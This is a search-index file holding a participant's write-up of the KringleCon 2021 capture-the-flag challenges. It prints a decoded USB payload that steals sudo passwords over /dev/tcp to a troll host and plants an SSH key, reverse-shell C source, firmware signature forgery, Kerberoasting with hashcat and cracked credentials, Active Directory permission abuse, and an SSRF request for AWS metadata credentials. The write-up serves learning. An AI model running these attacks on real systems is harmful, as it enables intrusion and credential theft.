{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"Kringle Con 2021 Welcome to my write-up for Kringle Con 2021!","title":"Kringle Con 2021"},{"location":"#kringle-con-2021","text":"Welcome to my write-up for Kringle Con 2021!","title":"Kringle Con 2021"},{"location":"formatting/","text":"Header test test","title":"Formatting"},{"location":"objectives/","text":"Objectives Objective 1: Orientation Objective 1 is great for getting your bearings KringleCon. First, for Objective 1a , talk to Jingle Ringford. Do this by clicking on them with your mouse. Next complete Objective 1b . Get your badge. This is critical! After you have your badge, for Objective 1c , pick up your wifi adapter. How cool is that! And now for your Objective 1d -- the last in this series and the first terminal challenge of Holiday Hack 2021. The answer to type is \"answer\"! Success! Let's goooooooooooo! Objective 2: Santaigo To solve this \"Where in the world is Caramel Santaigo?\" challenge, start by talking to Piney Sappington in Santa's courtyard. Piney points us to the ExifMetadata terminal challenge. (See \"Terminals\" in the left navigation.) After getting hints from Piney, it is time to play \"Where in the world is Caramel Santaigo?\" My son got really good at this. He advised me as I fumbled through it. My strategy was to go through the game a few times and take down notes as I researched the points below. This allowed me to move quickly and grab elf characteristics in order to filter them in the InterRink database. With the notes below, I quickly knew where I needed to ride the sleigh next. Hints from Piney Sappington help with the MGRS navigation data and three-words: https://en.wikipedia.org/wiki/Military_Grid_Reference_System https://what3words.com/ Countries from OSINT Investigations: \"only, milder, vanilla\" - Japan \"staring desire frost\" - Iceland \"frozen,push,tamed\" - England 32U NU 05939 98268 - Germany 33U VR 58560 48464 - Czech Republic 137.208.0.0/16 - Austria 51.219,4.402 - Belgium 81.244.0.0/14 - Belgium D\u00e9fil\u00e9 de No\u00ebl - Canada Tivoli Gardens - Copenhagen Objective 3: Frost Tower To solve this \"Thaw Frost Tower's Entrance\" challenge, start by talking to Greasy Gopherguts. Greasy was very generous with hints. Greasy offered the following nudges: Consider using the following wifi commands: iwlist and iwconfig. Great for managing wi-fi from the Linux command line! cURL is great a way to interact with web pages via command line. Lastly, there may come a time where you need to send a POST request. Do this with the --data-binary option. To solve this challenge: Get close to the entrace of Frost's Tower Go to \"items\" in your badge and click on the \"Wifi Dongle\" Use \"iwlist scanning\" and notice the following SSID. Connect to this SSID with the following command: iwconfig wlan0 essid \"FROST-Nidus-Setup\" Check the thermostat's http interface using cURL. curl http://nidus-setup:8080/ Notice that there is a registration page. curl http://nidus-setup:8080/register Also, notice there is an apidoc page. Using this and hits from Greasy Gopherguts, execute the following API update: curl --data-binary '{\"temperature\":40}' http://nidus-setup:8080/api/cooler Objective 4: Slot Machine Answer: \"I'm going to have some bouncer trolls bounce you right back out of this casino!\" Now it is time for the \"Slot Machine Investigation\" challenge. Better go talk to Noel Boetie first. Noel suggests: That the slot machine is subject to parameter tampering. Proxies like Burp can help to resend a request with different parameters. Even Firefox can do this! This might be a handy guide for navigating code logic: http://www.natna.info/English/Teaching/CSI30-materials/Chapter1-cheat-sheet.pdf Use the above hints: Start tampering parameters in a proxy like Burp. Notice that winnings increase when numline is negative. In this case, I set it to negative 3. Continue to send this request until credit is higher than 1000. Check server response in Burp and notice that you might be in a bit of trouble now. \"I'm going to have some bouncer trolls bounce you right back out of this casino!\" Objective 5: USB Device Answer: ickymcgoop Apparently we need to do some reverse engineering for this \"Strange USB Device\" challenge. We need to assist the elves in reverse engineering the strange USB device. We'll visit Santa's Talks Floor and hit up Jewel Loggins for advice. Jewel provides: Mallard Writing USB Payloads Ducky Script Run mallard.py to decde the inject.bin binary: python ./mallard.py --file /mnt/USBDEVICE/inject.bin ENTER STRING echo \"Sorry, try again.\" ENTER STRING sudo $@ ENTER STRING else ENTER STRING echo \"$USER:$pwd:valid\" > /dev/tcp/trollfun.jackfrosttower.com/1337 ENTER STRING echo \"$pwd\" | /usr/bin/sudo -S $@ ENTER STRING fi ENTER STRING fi' > ~/.config/sudo/sudo ENTER DELAY 200 STRING chmod u+x ~/.config/sudo/sudo ENTER DELAY 200 STRING echo \"export PATH=~/.config/sudo:$PATH\" >> ~/.bash_profile ENTER DELAY 200 STRING echo \"export PATH=~/.config/sudo:$PATH\" >> ~/.bashrc ENTER DELAY 200 STRING echo ==gCzlXZr9FZlpXay9Ga0VXYvg2cz5yL+BiP+AyJt92YuIXZ39Gd0N3byZ2ajFmau4WdmxGbvJHdAB3bvd2Ytl3ajlGILFESV1mWVN2SChVYTp1VhNlRyQ1UkdFZopkbS1EbHpFSwdlVRJlRVNFdwM2SGVEZnRTaihmVXJ2ZRhVWvJFSJBTOtJ2ZV12YuVlMkd2dTVGb0dUSJ5UMVdGNXl1ZrhkYzZ0ValnQDRmd1cUS6x2RJpHbHFWVClHZOpVVTpnWwQFdSdEVIJlRS9GZyoVcKJTVzwWMkBDcWFGdW1GZvJFSTJHZIdlWKhkU14UbVBSYzJXLoN3cnAyboNWZ | rev | base64 -d | bash ENTER DELAY 600 STRING history -c && rm .bash_history && exit ENTER DELAY 600 GUI q Un-reversing the string above and then decoding it from base64: echo 'ssh-rsa UmN5RHJZWHdrSHRodmVtaVp0d1l3U2JqZ2doRFRHTGRtT0ZzSUZNdyBUaGlzIGlzIG5vdCByZWFsbHkgYW4gU1NIIGtleSwgd2UncmUgbm90IHRoYXQgbWVhbi4gdEFKc0tSUFRQVWpHZGlMRnJhdWdST2FSaWZSaXBKcUZmUHAK ickymcgoop@trollfun.jackfrosttower.com' >> ~/.ssh/authorized_keys We see that the user in question is listed as the user for whom a public key is being injected. Objective 6: Shellcode Answer: \"cyber security knowledge\" For this objective we need to completed the Shellcode Primer in Jack's office. But need to talk to Chimney Scissorsticks in the NetWars area for hints first. Hints from Chimney Scissorsticks (after successfully playing \"Santa's Holiday Hero\" in the Netwars area). \"If you run into any shellcode primers at the North Pole, be sure to read the directions and the comments in the shellcode source!\" \"Also, troubleshooting shellcode can be difficult. Use the debugger step-by-step feature to watch values.\" \"Lastly, be careful not to overwrite any register values you need to reference later on in your shellcode.\" Hello World call hello db \"Hello World!\",0 ;put reference to string in correct register hello: pop rbp mov rax, 1 ;syscall for write mov rdi, 1 ;file descriptor mov rsi, rbp ;set rsi to string mov rdx, 12 ;set rdx to length of string syscall ;perform syscall using rax value and paremeters ret; return cleanly Opening a File call stringtoregister db '/etc/passwd',0 stringtoregister: pop rbp mov rax, 2 ;correct syscall number for opening file mov rdi, rbp ;set rdi to filename mov rsi, 0 ;set rsi to second arg - 0 is fine - file descriptor mov rdx,0 ;set rdx to third arg - 0 is fine syscall ;perform the syscall ;syscall sets rax to the file handle ret Reading a File \"Secret to KringleCon success: all of our speakers and organizers, providing the gift of cyber security knowledge, free to the community.\" call getfilename db '/var/northpolesecrets.txt',0 getfilename: pop rbp ; TODO: Call sys_open mov rax, 2 ;correct syscall number for opening file mov rdi, rbp ;set rdi to filename mov rsi, 0 ;set rsi to second arg - 0 is fine - file descriptor mov rdx,0 ;set rdx to third arg - 0 is fine syscall ;perform the syscall ; TODO: Call sys_read on the file handle and read it into rsp mov rax, 0 mov rsi, rsp ;reading into buffer mov rdi, 3 mov rdx, 256 syscall ; TODO: Call sys_write to write the contents from rsp to stdout (1) mov rax, 1 mov rdi, 1 mov rsi, rsp mov rdx, 256 syscall ; TODO: Call sys_exit mov rax, 60 mov rdi, 99 syscall Objective 7: Printer Answer: Troll_Pay_Chart.xlsx Hints: Files placed in /app/lib/public/incoming will be accessible under https://printer.kringlecastle.com/incoming/. When analyzing a device, it's always a good idea to pick apart the firmware. Sometimes these things come down Base64-encoded. Hash Extension Attacks can be super handy when there's some type of validation to be circumvented. If you append multiple files of a given type, the last one is processed Read this: Hash Extension Article Recon Steps: 1. Carefully read the hash extension write-up. 2. Do the examples in the write-up to see how it works. 3. Download GitHub repository (in article) and \"make\" the hash_extender binary. 4. May need to do \"sudo apt install libssl-dev\" if you're getting error. 5. Download the printer firmware from \"Firmware Update\" page. 6. Notice that it contains \"secret_length\" and \"signature\" 7. Also notice that the firmware itself is base64 encoded. Exploit Steps: 1. Create a reverse shell binary payload. (See below) - Alternatively, binary can simply move log file where you can read it. - \"cp /var/spool/printer.log /app/lib/public/incoming/somefile.txt\" 4. Zip up this payload into a \"firmware2.zip\" file. 5. Convert this \"firmware2.zip\" into hex. I just did this at CyberChef. 6. Create a duplicate firmware upload called \"firmware-export2.json\" 7. Run \"hash_extender\" with parameters in bash script. (See below) 8. Copy new signature into \"firmware-export2.json\" 9. Take result of \"hash_extender\" script to CyberChef. 10. Use \"from Hex\" to get it to raw. 11. Base64 encode it and add to \"firmware\" section of \"firmware-export2.json\" 12. Start listener on attacking machine \"nc -nvlp 8888\" 13. Upload \"firware-export2.json\" to printer interface for \"update\" 14. Pop a shell!! 15. Run \"tail /var/spool/printer.log\" 16. See the filename is \"Troll_Pay_Chart.xlsx\" 17. Enter this answer into objective. Boom! Objective solved. Build Payload: reverse_shell.c /* credits to http://blog.techorganic.com/2015/01/04/pegasus-hacking-challenge/ */ #include <stdio.h> #include <unistd.h> #include <netinet/in.h> #include <sys/types.h> #include <sys/socket.h> #define REMOTE_ADDR \"re.dac.t.ed\" #define REMOTE_PORT 8888 int main(int argc, char *argv[]) { struct sockaddr_in sa; int s; sa.sin_family = AF_INET; sa.sin_addr.s_addr = inet_addr(REMOTE_ADDR); sa.sin_port = htons(REMOTE_PORT); s = socket(AF_INET, SOCK_STREAM, 0); connect(s, (struct sockaddr *)&sa, sizeof(sa)); dup2(s, 0); dup2(s, 1); dup2(s, 2); execve(\"/bin/bash\", 0, 0); return 0; } Compile Payload: gcc -o firmware.bin reverse_shell.c Zip Payload: zip -r firware2.zip firware.bin Hash Extender Parameters: #!/bin/bash ./hash_extender \\ --file firmware.zip \\ --signature 2bab052bf894ea1a255886fde202f451476faba7b941439df629fdeb1ff0dc97 \\ --append \"[hex of zipped binary payload goes here]\" \\ --append-format=hex \\ --secret 16 \\ --format sha256 \\ --out-data-format=hex Shell: Connection received on re.dac.te.d 56918 Objective 8: Kerberoasting Kerberoasting on an Open Fire Answer: \"Kindness\" Obtain the secret sleigh research document from a host on the Elf University domain. What is the first secret ingredient Santa urges each elf and reindeer to consider for a wonderful holiday season? Start by registering as a student on the ElfU Portal. Find Eve Snowshoes in Santa's office for hints. Find Eve Snowshoes in Santa's Office for hints. Hints - Investigating Active Directory errors is harder without Bloodhound, but there are native methods. - Learn about Kerberoasting to leverage domain credentials to get usernames and crackable hashes for service accounts. - Administrators often store credentials in scripts. These can be coopted by an attacker for other purposes! - Check out Chris Davis' talk and scripts on Kerberoasting and Active Directory permissions abuse. - OneRuleToRuleThemAll.rule is great for mangling when a password dictionary isn't enough. - CeWL can generate some great wordlists from website, but it will ignore digits in terms by default. Initial Access (Use registration page listed in the objective to get credentials.) ssh xvduawqtni@grades.elfu.org -p 2222 ElfU Domain Username: xvduawqtni ElfU Domain Password: Hbqwldgap# Spawn Shell from Python import pty; pty.spawn(\"/bin/bash\") Recon nmap -v -A 172.17.0.4 Found the domain controller. PORT STATE SERVICE VERSION 42/tcp open nameserver? 53/tcp open domain (generic dns response: NOTIMP) | fingerprint-strings: | DNSVersionBindReqTCP: | version |_ bind 88/tcp open kerberos-sec Heimdal Kerberos (server time: 2021-12-25 12:58:19Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: ELFU) 389/tcp open ldap (Anonymous bind OK) | ssl-cert: Subject: commonName=SHARE30.elfu.local/organizationName=Samba Administration | Issuer: commonName=SHARE30.elfu.local/organizationName=Samba Administration | Public Key type: rsa | Public Key bits: 4096 | Signature Algorithm: sha1WithRSAEncryption | Not valid before: 2021-10-29T19:30:08 | Not valid after: 2023-09-29T19:30:08 | MD5: cab3 d377 caef 900f b3e9 7ce5 3369 e216 |_SHA-1: bdb4 641f af06 b2b4 fa47 43da 8184 f1b1 5281 c04a |_ssl-date: 2021-12-25T12:58:46+00:00; -29s from scanner time. 445/tcp open netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: ELFU) 464/tcp open kpasswd5? 636/tcp open ssl/ldap (Anonymous bind OK) | ssl-cert: Subject: commonName=SHARE30.elfu.local/organizationName=Samba Administration | Issuer: commonName=SHARE30.elfu.local/organizationName=Samba Administration | Public Key type: rsa | Public Key bits: 4096 | Signature Algorithm: sha1WithRSAEncryption | Not valid before: 2021-10-29T19:30:08 | Not valid after: 2023-09-29T19:30:08 | MD5: cab3 d377 caef 900f b3e9 7ce5 3369 e216 |_SHA-1: bdb4 641f af06 b2b4 fa47 43da 8184 f1b1 5281 c04a |_ssl-date: 2021-12-25T12:57:23+00:00; -1m52s from scanner time. 1024/tcp open msrpc Microsoft Windows RPC 3268/tcp open ldap (Anonymous bind OK) | ssl-cert: Subject: commonName=SHARE30.elfu.local/organizationName=Samba Administration | Issuer: commonName=SHARE30.elfu.local/organizationName=Samba Administration | Public Key type: rsa | Public Key bits: 4096 | Signature Algorithm: sha1WithRSAEncryption | Not valid before: 2021-10-29T19:30:08 | Not valid after: 2023-09-29T19:30:08 | MD5: cab3 d377 caef 900f b3e9 7ce5 3369 e216 |_SHA-1: bdb4 641f af06 b2b4 fa47 43da 8184 f1b1 5281 c04a |_ssl-date: 2021-12-25T12:57:45+00:00; -1m30s from scanner time. 3269/tcp open ssl/ldap (Anonymous bind OK) | ssl-cert: Subject: commonName=SHARE30.elfu.local/organizationName=Samba Administration | Issuer: commonName=SHARE30.elfu.local/organizationName=Samba Administration | Public Key type: rsa | Public Key bits: 4096 | Signature Algorithm: sha1WithRSAEncryption | Not valid before: 2021-10-29T19:30:08 | Not valid after: 2023-09-29T19:30:08 | MD5: cab3 d377 caef 900f b3e9 7ce5 3369 e216 |_SHA-1: bdb4 641f af06 b2b4 fa47 43da 8184 f1b1 5281 c04a |_ssl-date: 2021-12-25T13:00:10+00:00; +55s from scanner time. 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port53-TCP:V=7.80%I=7%D=12/25%Time=61C71570%P=x86_64-pc-linux-gnu%r(DNS SF:VersionBindReqTCP,2B,\"\\0\\)\\0\\x06\\x81\\x80\\0\\x01\\0\\0\\0\\0\\0\\x01\\x07version SF:\\x04bind\\0\\0\\x10\\0\\x03\\0\\0\\)\\x02\\0\\0\\0\\0\\0\\0\\0\")%r(DNSStatusRequestTCP, SF:E,\"\\0\\x0c\\0\\0\\x90\\x04\\0\\0\\0\\0\\0\\0\\0\\0\"); Service Info: Host: SHARE30; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: -25s, deviation: 57s, median: 0s | nbstat: NetBIOS name: SHARE30, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown) | Names: | SHARE30<00> Flags: <unique><active> | SHARE30<03> Flags: <unique><active> | SHARE30<20> Flags: <unique><active> | ELFU<1c> Flags: <group><active> | ELFU<00> Flags: <group><active> | __SAMBA__<00> Flags: <group><active><permanent> |_ __SAMBA__<20> Flags: <group><active><permanent> | smb-os-discovery: | OS: Windows 6.1 (Samba 4.3.11-Ubuntu) | Computer name: share30 | NetBIOS computer name: SHARE30\\x00 | Domain name: elfu.local | FQDN: share30.elfu.local |_ System time: 2021-12-25T12:59:07+00:00 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: required | smb2-security-mode: | 2.02: |_ Message signing enabled and required | smb2-time: | date: 2021-12-25T12:59:07 |_ start_date: N/A ./GetADUsers.py ELFU.LOCAL/bltxerbtzt:Lhyzaydwl! -all Some users to be on the lookout for. Name PasswordLastSet LastLogon -------------------- ------------------- ------------------- Administrator 2021-10-26 18:45:29.572963 2021-11-02 13:20:47.321794 Guest <never> <never> admin 2021-10-26 18:41:00.590204 2021-10-26 18:46:32.818591 krbtgt 2021-10-29 19:21:35.937317 <never> elfu_admin 2021-10-29 19:24:53.572006 2021-12-25 15:15:40.806162 elfu_svc 2021-10-29 19:25:04.305279 2021-12-25 14:11:45.258629 remote_elf 2021-10-29 19:25:30.961706 2021-12-25 15:17:49.064199 smbclient -L //172.17.0.4 smbclient -L //172.17.0.4/ Enter WORKGROUP\\vvghojousn's password: Sharename Type Comment --------- ---- ------- netlogon Disk sysvol Disk elfu_svc_shr Disk elfu_svc_shr research_dep Disk research_dep IPC$ IPC IPC Service (Samba 4.3.11-Ubuntu) Notice some interesting shares. They are either empty or inaccessible. smbclient //172.17.0.4/netlogon (empty) smbclient //172.17.0.4/sysvol (elfu.local\\scripts\\*empty*) smbclient //172.17.0.4/elfu_svc_shr (NT_STATUS_ACCESS_DENIED) smbclient //172.17.0.4/research_dep (NT_STATUS_ACCESS_DENIED) smbclient //172.17.0.4/IPC$ ./GetUserSPNs.py elfu.local/bltxerbtzt:Lhyzaydwl! -outputfile ~/tgs.txt Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation ServicePrincipalName Name MemberOf PasswordLastSet LastLogon Delegation ----------------------------------- -------- -------- -------------------------- -------------------------- ---------- ldap/elfu_svc/elfu elfu_svc 2021-10-29 19:25:04.305279 2021-12-25 14:11:45.258629 ldap/elfu_svc/elfu.local elfu_svc 2021-10-29 19:25:04.305279 2021-12-25 14:11:45.258629 ldap/elfu_svc.elfu.local/elfu elfu_svc 2021-10-29 19:25:04.305279 2021-12-25 14:11:45.258629 ldap/elfu_svc.elfu.local/elfu.local elfu_svc 2021-10-29 19:25:04.305279 2021-12-25 14:11:45.258629 Possible passwords from CEWL list (registration page) rocks4socks cookiepella asnow2021 v0calprezents Hexatonics reindeers4fears hashcat -m 13100 -a 0 tgs.txt --potfile-disable -r OneRuleToRuleThemAll.rule --force -O -w 4 --opencl-device-types 1,2 cewl.txt $krb5tgs$23$*elfu_svc$ELFU.LOCAL$elfu.local/elfu_svc*$8d8f349b6173fcda2e9a6814b477f91f$5ab1a80efb8c7dae30d59fa6d3a88c2a1d341d24158f7bd89b1f1dcc81c5ed5533ffcfc9077e3a6c8fae406e35f00412c783ab9a8dc55f20cf1801d2cf8376a344a7e6692b66f1f717dabd2fefca9e3af7e1e6719c15e4070958f7e1c79aea2d7fef5292c4ee58e5188d8a19423ab1116fbe2379ba84ab79eb1b3181fd795ab96ac2529b392ac999a9f3c608479be1a68f8e9f4a2f7359c240162cf4b2ed51df3f3b20159e2188831505a3670fee9e3fe7c043235fe008fe367a18b7508aa73e1fc7fad1337a4af191e2fa38e038fc4263b48d0448d99e32edd6d8f6cadb3a7ef6b561334246c5836c38e236a4649911c781424f78202d3098d498bfe49d250160f70eae45a13028bb736f9b0900e7e1ab5ac9a7b3a407a81fff6d66416a470ba3308d0d8e2320bb31d77fd623764ebda28a6f036f3be25c232f2bb21c2507c1a06e4f204df664e76355dfb001a59a9b03c6c5fbee6a290b542dc0e06ad19e3c7e55c9a2ef0cab690d2ffad1b8d1596293d4bb2772c77066f24b5c6a0aa08f5977a196f81b8240d9b5d76332c1f0ec7e18195ab78483302113cd8ea1dcdde7c25ffd31d25a1f00d0398ef3f8f55a650359e4503d6fa346304ce3b060c97fbb745bc3970804ac467a1f2c9c84badd1265cc1834c0794b4523f943cb68470ac8e6fbd26a9bf7c629c45aca1fed83494aa5fb37361c1effac2ef4bf07a990377c539490528a14caf3540ca31ae523e73e72b1b547206a70f6a1b107d29c6584ab32112bd64607756a87345ab42224fc9fd43ed254ebf59061ae3204d922958469d636dd3aa2ffb13693f056ac39b13a0f71df6ac2a2ebe6866bbf44be9c78b7d43d6719500589350ddac312e8aa6de4a3feaab5b80705e7e3866b0b6d9fd79138530648f1294363ad89c6392810c5936bcaf80080d7ba3b855f98c8febdb8b7a9f0891995dd962d6a2b5ee09b1ab7436a511fdd152ff2ca06a387e529368fc73fd6f6b9de6695cfd3f521b34f7a426c8c3d4e3d575ecbe13912363eeee8e0a83b0efc04d7e32b54855621692dfda367eb23893fda4745a09421d5362fe8ca338282cdb027eba1da797f266a2c4f65a3f137983ecca12a3c82d834ceb10a8e839279fdebdae0252c49ae2d0572b6d5cfa8603d00f6a0a0daedf64460ae55351ad5df2bd25f2b6c74f5a0243b7745b92512847168bb71a09c232bccfaa0efe73b009a15ab9c756e3bf6cc8fbe3af4be8837b11fe553e3529aa175a655cd9fbec58be02b646eacbc0d26cafc4f6837603101b8c0dfb8012571042c26a9c1bd3f825a0be85e289c06480949798f383e91586df0ff00a4c34014d3da7494bb208db078f3ad96bd76130f93ba6c058404a280042441da2048e8d3270d0ab2930e61bf4937d8598bf4e41e7b1cc1fe58bf9244b5e9d14c4ec44a7ae3fbe0860e808d18e0b5c4c8488dd9:Snow2021! Session..........: hashcat Status...........: Cracked Hash.Type........: Kerberos 5 TGS-REP etype 23 Hash.Target......: $krb5tgs$23$*elfu_svc$ELFU.LOCAL$elfu.local/elfu_sv...488dd9 Time.Started.....: Sat Dec 25 16:06:45 2021 (13 secs) Time.Estimated...: Sat Dec 25 16:06:58 2021 (0 secs) Guess.Base.......: File (cewl.txt) Guess.Mod........: Rules (OneRuleToRuleThemAll.rule) Guess.Queue......: 1/1 (100.00%) Speed.#1.........: 233.2 kH/s (10.27ms) @ Accel:64 Loops:32 Thr:64 Vec:16 Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts Progress.........: 3134208/4003615 (78.28%) Rejected.........: 0/3134208 (0.00%) Restore.Point....: 0/77 (0.00%) Restore.Sub.#1...: Salt:0 Amplifier:40672-40704 Iteration:0-32 Candidates.#1....: _The_ -> cimes Password: Snow2021! smbclient -U elfu_svc //172.17.0.4/elfu_svc_shr Use the password from the cracked hash Can now see all the files on this share: elfu_svc_shr cat .ps1 | grep -l -R remote_elf Found this file: (after grep for \"remote_elf\") GetProcessInfo.ps1 powershell -Command \"./GetProcessInfo.ps1\" $SecStringPassword = \"76492d1116743f0423413b16050a5345MgB8AGcAcQBmAEIAMgBiAHUAMwA5AGIAbQBuAGwAdQAwAEIATgAwAEoAWQBuAGcAPQA9AHwANgA5ADgAMQA1ADIANABmAGIAMAA1AGQAOQA0AGMANQBlADYAZAA2ADEAMgA3AGIANwAxAGUAZgA2AGYAOQBiAGYAMwBjADEAYwA5AGQANABlAGMAZAA1ADUAZAAxADUANwAxADMAYwA0ADUAMwAwAGQANQA5ADEAYQBlADYAZAAzADUAMAA3AGIAYwA2AGEANQAxADAAZAA2ADcANwBlAGUAZQBlADcAMABjAGUANQAxADEANgA5ADQANwA2AGEA\" $aPass = $SecStringPassword | ConvertTo-SecureString -Key 2,3,1,6,2,8,9,9,4,3,4,5,6,8,7,7 $aCred = New-Object System.Management.Automation.PSCredential -ArgumentList (\"elfu.local\\remote_elf\", $aPass) Invoke-Command -ComputerName 10.128.1.53 -ScriptBlock { Get-Process } -Credential $aCred -Authentication Negotiate NPM(K) PM(M) WS(M) CPU(s) Id SI ProcessName PSComputerNam e ------ ----- ----- ------ -- -- ----------- ------------- 9 4.30 10.10 0.00 1444 0 conhost 10.128.1.53 9 6.54 12.22 0.02 4020 0 conhost 10.128.1.53 20 2.31 5.46 0.00 596 0 csrss 10.128.1.53 9 1.64 4.71 0.00 676 1 csrss 10.128.1.53 32 17.13 22.79 0.00 3912 0 dfsrs 10.128.1.53 12 2.46 7.86 0.00 2940 0 dfssvc 10.128.1.53 powershell -C \"./remote.ps1\" Now insert script blocks from presentation. List users who have writeDacl to \"Research Department\" Give \"Generic All\" to my low-priv domain user for this group. Add my low-priv user to this group. Invoke-Command -ComputerName 10.128.1.53 -ScriptBlock { # 1. $ADSI = [ADSI]\"LDAP://CN=Research Department,CN=Users,DC=elfu,DC=local\" $ADSI.psbase.ObjectSecurity.GetAccessRules($true,$true,[Security.Principal.NTAccount]) # 2. Add-Type -AssemblyName System.DirectoryServices $ldapConnString = \"LDAP://CN=Research Department,CN=Users,DC=elfu,DC=local\" $username = \"xvduawqtni\" $nullGUID = [guid]'00000000-0000-0000-0000-000000000000' $propGUID = [guid]'00000000-0000-0000-0000-000000000000' $IdentityReference = (New-Object System.Security.Principal.NTAccount(\"elfu.local\\$username\")).Translate([System.Security.Principal.SecurityIdentifier]) $inheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance]::None $ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference, ([System.DirectoryServices.ActiveDirectoryRights] \"GenericAll\"), ([System.Security.AccessControl.AccessControlType] \"Allow\"), $propGUID, $inheritanceType, $nullGUID $domainDirEntry = New-Object System.DirectoryServices.DirectoryEntry $ldapConnString $secOptions = $domainDirEntry.get_Options() $secOptions.SecurityMasks = [System.DirectoryServices.SecurityMasks]::Dacl $domainDirEntry.RefreshCache() $domainDirEntry.get_ObjectSecurity().AddAccessRule($ACE) $domainDirEntry.CommitChanges() $domainDirEntry.dispose() # 3. Add-Type -AssemblyName System.DirectoryServices $ldapConnString = \"LDAP://CN=Research Department,CN=Users,DC=elfu,DC=local\" $username = \"xvduawqtni\" $password = \"Hbqwldgap#\" $domainDirEntry = New-Object System.DirectoryServices.DirectoryEntry $ldapConnString, $username, $password $user = New-Object System.Security.Principal.NTAccount(\"elfu.local\\$username\") $sid=$user.Translate([System.Security.Principal.SecurityIdentifier]) $b=New-Object byte[] $sid.BinaryLength $sid.GetBinaryForm($b,0) $hexSID=[BitConverter]::ToString($b).Replace('-','') $domainDirEntry.Add(\"LDAP://<SID=$hexSID>\") $domainDirEntry.CommitChanges() $domainDirEntry.dispose() } -Credential $aCred -Authentication Negotiate remote_elf has WriteDacl on \"Research Department\" group PSComputerName : 10.128.1.53 RunspaceId : 82625daa-6e87-4675-a5db-da200050c428 ActiveDirectoryRights : WriteDacl InheritanceType : None ObjectType : 00000000-0000-0000-0000-000000000000 InheritedObjectType : 00000000-0000-0000-0000-000000000000 ObjectFlags : None AccessControlType : Allow IdentityReference : ELFU\\remote_elf IsInherited : False InheritanceFlags : None PropagationFlags : None added my user to \"Research Department\" group PSComputerName : 10.128.1.53 RunspaceId : 82625daa-6e87-4675-a5db-da200050c428 ActiveDirectoryRights : GenericAll InheritanceType : None ObjectType : 00000000-0000-0000-0000-000000000000 InheritedObjectType : 00000000-0000-0000-0000-000000000000 ObjectFlags : None AccessControlType : Allow IdentityReference : ELFU\\xvduawqtni IsInherited : False InheritanceFlags : None PropagationFlags : None smbclient -U xvduawqtni //172.17.0.4/research_dep (password: Hbqwldgap#) Enter WORKGROUP\\xvduawqtni's password: Try \"help\" to get a list of possible commands. smb: \\> dir . D 0 Thu Dec 2 16:39:42 2021 .. D 0 Sun Dec 26 08:01:29 2021 SantaSecretToAWonderfulHolidaySeason.pdf N 173932 Thu Dec 2 16:38:26 2021 41089256 blocks of size 1024. 34768316 blocks available Objective 9: Splunk! Answer: whiz Help Angel Candysalt solve the Splunk challenge in Santa's great hall. Fitzy Shortstack is in Santa's lobby, and he knows a few things about Splunk. What does Santa call you when when you complete the analysis? Capture the commands Eddie ran most often, starting with git. Looking only at his process launches as reported by Sysmon, record the most common git-related CommandLine that Eddie seemed to use. Tip: Add \"CommandLine\" to Splunk columns Answer: git status Looking through the git commands Eddie ran, determine the remote repository that he configured as the origin for the 'partnerapi' repo. The correct one! Tip: Look at rare commands * Answer: git@github.com:elfnp3/partnerapi.git The 'partnerapi' project that Eddie worked on uses Docker. Gather the full docker command line that Eddie used to start the 'partnerapi' project on his workstation. Answer: docker compose up Eddie had been testing automated static application security testing (SAST) in GitHub. Vulnerability reports have been coming into Splunk in JSON format via GitHub webhooks. Search all the events in the main index in Splunk and use the sourcetype field to locate these reports. Determine the URL of the vulnerable GitHub repository that the elves cloned for testing and document it here. You will need to search outside of Splunk (try GitHub) for the original name of the repository. https://github.com/elfnp3/dvws-node Answer: https://github.com/snoopysecurity/dvws-node Santa asked Eddie to add a JavaScript library from NPM to the 'partnerapi' project. Determine the name of the library and record it here for our workshop documentation. Answer: holiday-utils-js Another elf started gathering a baseline of the network activity that Eddie generated. Start with their search and capture the full process_name field of anything that looks suspicious. Answer: /usr/bin/nc.openbsd Uh oh. This documentation exercise just turned into an investigation. Starting with the process identified in the previous task, look for additional suspicious commands launched by the same parent process. One thing to know about these Sysmon events is that Network connection events don't indicate the parent process ID, but Process creation events do! Determine the number of files that were accessed by a related process and record it here. Answer: 6 Use Splunk and Sysmon Process creation data to identify the name of the Bash script that accessed sensitive files and (likely) transmitted them to a remote IP address. Answer: preinstall.sh Objective 10: Now Hiring! Answer: CGgQcSdERePvGgr058r3PObPq3+0CfraKcsLREpX What is the secret access key for the Jack Frost Tower job applications server? Brave the perils of Jack's bathroom to get hints from Noxious O. D'or. Hint: https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html FORM REQUEST GET /?inputName=106&inputEmail=101%40gmail.com& inputPhone=1234567890& inputField=Aggravated+pulling+of+hair&resumeFile=web_purple_expense.zip& inputWorkSample=http://169.254.169.254/latest/meta-data/iam/security-credentials/jf-deploy-role/& additionalInformation=&submit= HTTP/2 Host: apply.jackfrosttower.com User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: https://apply.jackfrosttower.com/?p=apply Upgrade-Insecure-Requests: 1 Te: trailers FORM RESPONSE <div class=\"row\"> <div class=\"col-sm-4\"> <div class=\"card text-white bg-primary mb-3\" style=\"max-width: 20rem;\"> <div class=\"card-body\"> <p class=\"card-text\"><h3><br />Naughty list recipients rejoice!<br /><br /><br /></h3></p> </div> </div> </div> <div class=\"col-sm-4\"> <div class=\"card text-white bg-secondary mb-3\" style=\"max-width: 20rem;\"> <div class=\"card-body\"> <img class=\"rounded mx-auto d-block\" src=\"images/106.jpg\" width=\"200px\" /> 